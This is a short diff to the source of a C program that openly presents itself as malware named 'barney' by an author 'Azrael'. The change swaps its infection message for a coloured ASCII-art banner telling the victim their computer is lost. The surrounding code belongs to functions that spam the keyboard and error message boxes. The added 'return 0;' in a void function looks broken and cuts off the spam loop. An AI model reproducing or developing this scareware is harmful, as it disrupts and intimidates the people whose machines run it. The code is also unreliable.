@@ -116,11 +116,21 @@ void keyboardspam()
 void trollies()
 {
 
-    printf("\n"
-        "You got infected by barney,\n"
-        "your computer isn't yours anymore but belongs to barney.\n"
-        "You have 5 minutes to save your computer. Good luck :D\n\n"
-        "                        Malware Author: Azrael\n");
+    printf("\x1b[35m"); // Set text color to purple
+    printf("__________    _____ __________  _______  ________________.___.\n"
+           "\\______   \\  /  _  \\\\______   \\ \\      \\ \\_   _____/\\__  |   |\n"
+           " |    |  _/ /  /_\\  \\|       _/ /   |   \\ |    __)_  /   |   |\n"
+           " |    |   \\/    |    \\    |   \\/    |    \\|        \\ \\____   |\n"
+           " |______  /\\____|__  /____|_  /\\____|__  /_______  / / ______|\n"
+           "        \\/         \\/       \\/         \\/        \\/  \\/       \n");
+    printf("\n");
+    printf("                     Malware Author: Azrael        \n"
+           "           You got infected by barney malware :D\n"
+           "         Goodluck on trying to recover your computer.\n");
+    printf("\x1b[0m"); // Reset text color
+    printf("\n");
+
+    return 0;
 
     //Spam error message box
     for (int i = 0; i < 10; i++)
